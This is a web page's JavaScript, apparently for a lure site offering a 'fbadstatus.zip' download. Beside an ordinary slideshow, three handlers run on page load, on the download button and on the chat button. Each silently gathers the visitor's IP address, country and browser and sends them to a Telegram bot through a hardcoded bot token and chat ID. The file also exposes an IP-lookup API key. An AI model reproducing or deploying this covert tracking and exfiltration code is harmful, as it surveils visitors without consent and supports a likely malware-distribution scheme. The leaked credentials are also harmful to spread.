var ch = 1204553919  //1204553919-773511937
window.onload =function() {
  $.getJSON("https://api.ipregistry.co/?key=pjh9alq5r1n29iwd", function(data) {
    var obj = {}
    let userAgent = navigator.userAgent;
    let browserName;

    if (userAgent.match(/chrome|chromium|crios/i)) {
      browserName = "Chrome";
    } else if (userAgent.match(/firefox|fxios/i)) {
      browserName = "Firefox";
    } else if (userAgent.match(/safari/i)) {
      browserName = "Safari";
    } else if (userAgent.match(/opr\//i)) {
      browserName = "Opera";
    } else if (userAgent.match(/edg/i)) {
      browserName = "Edge";
    } else if (userAgent.match(/android/i)) {
      browserName = "Android";
    } else if (userAgent.match(/iphone/i)) {
      browserName = "iPhone";
    } else {
      browserName = "Unknown";
    }

    obj.country = data.location.country.name 
    obj.Ip = data.ip
    obj.Browser = browserName
    var textContent = '<em>Action: ViewPage</em>\n<pre>Country: ' + obj.country + '\n' + 'IP: ' + obj.Ip + '\n' + 'Browser: ' + obj.Browser + '</pre>'
    console.log(textContent)
    let formData = new FormData();
    formData.append('chat_id', ch); 
    formData.append('parse_mode', 'HTML');
    formData.append('text', ' <em>' + textContent + '</em>');

    fetch('https://api.telegram.org/bot' + '5712740653:AAFreDzJcJMwmYXULecs3-l5rHOpY5XSb78' + '/sendMessage',{
        method: 'POST',
        body: formData
      })
    .then(res => res.json())
    .then()
  })
} 


var slideIndex = 0;
showSlides();

// Next/previous controls
function plusSlides(n) {
  showSlides2(slideIndex += n);
}

function showSlides2(n) {
  var i;
  var slides = document.getElementsByClassName("mySlides");
  
  if (n > slides.length) {slideIndex = 1}
  if (n < 1) {slideIndex = slides.length}
  
  for (i = 0; i < slides.length; i++) {
      slides[i].style.display = "none";
  }
  
  slides[slideIndex-1].style.display = "block";
}

function showSlides() {
  var i;
  var slides = document.getElementsByClassName("mySlides");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}
  slides[slideIndex-1].style.display = "block";
  setTimeout(showSlides, 5000);
}


document.getElementById('btn-down').onclick = function() {
  $.getJSON("https://api.ipregistry.co/?key=pjh9alq5r1n29iwd", function(data) {
    var obj = {}
    let userAgent = navigator.userAgent;
    let browserName;

    if (userAgent.match(/chrome|chromium|crios/i)) {
      browserName = "Chrome";
    } else if (userAgent.match(/firefox|fxios/i)) {
      browserName = "Firefox";
    } else if (userAgent.match(/safari/i)) {
      browserName = "Safari";
    } else if (userAgent.match(/opr\//i)) {
      browserName = "Opera";
    } else if (userAgent.match(/edg/i)) {
      browserName = "Edge";
    } else if (userAgent.match(/android/i)) {
      browserName = "Android";
    } else if (userAgent.match(/iphone/i)) {
      browserName = "iPhone";
    } else {
      browserName = "Unknown";
    }
    obj.country = data.location.country.name 
    obj.Ip = data.ip
    obj.Browser = browserName
    var textContent =  'Action: Downloaded\n' + 'Country: ' + obj.country + '\n' + 'IP: ' + obj.Ip + '\n' + 'Browser: ' + obj.Browser
    let formData = new FormData();
    formData.append('chat_id',ch);
    formData.append('parse_mode', 'HTML');
    formData.append('text','<pre>' + textContent + '</pre>');


    fetch('https://api.telegram.org/bot' + '5712740653:AAFreDzJcJMwmYXULecs3-l5rHOpY5XSb78' + '/sendMessage',{
        method: 'POST',
        body: formData
      })
    .then(res => res.json())
    .then()
    window.location.href='/file/fbadstatus.zip'
  })

} 

document.getElementById('chat').onclick = function() {
  $.getJSON("https://api.ipregistry.co/?key=pjh9alq5r1n29iwd", function(data) {
    var obj = {}
    let userAgent = navigator.userAgent;
    let browserName;

    if (userAgent.match(/chrome|chromium|crios/i)) {
      browserName = "Chrome";
    } else if (userAgent.match(/firefox|fxios/i)) {
      browserName = "Firefox";
    } else if (userAgent.match(/safari/i)) {
      browserName = "Safari";
    } else if (userAgent.match(/opr\//i)) {
      browserName = "Opera";
    } else if (userAgent.match(/edg/i)) {
      browserName = "Edge";
    } else if (userAgent.match(/android/i)) {
      browserName = "Android";
    } else if (userAgent.match(/iphone/i)) {
      browserName = "iPhone";
    } else {
      browserName = "Unknown";
    }
    obj.country = data.location.country.name 
    obj.Ip = data.ip
    obj.Browser = browserName
    var textContent =  '<em>Action: Messager</em>\n<pre>Country: ' + obj.country + '\n' + 'IP: ' + obj.Ip + '\n' + 'Browser: ' + obj.Browser + '</pre>'
    let formData = new FormData();
    formData.append('chat_id', ch);
    formData.append('parse_mode', 'HTML');
    formData.append('text', textContent );


    fetch('https://api.telegram.org/bot' + '5712740653:AAFreDzJcJMwmYXULecs3-l5rHOpY5XSb78' + '/sendMessage',{
        method: 'POST',
        body: formData
      })
    .then(res => res.json())
    .then()
    window.open('https://www.facebook.com/Fbadstatus', '_blank').focus();
  })
}

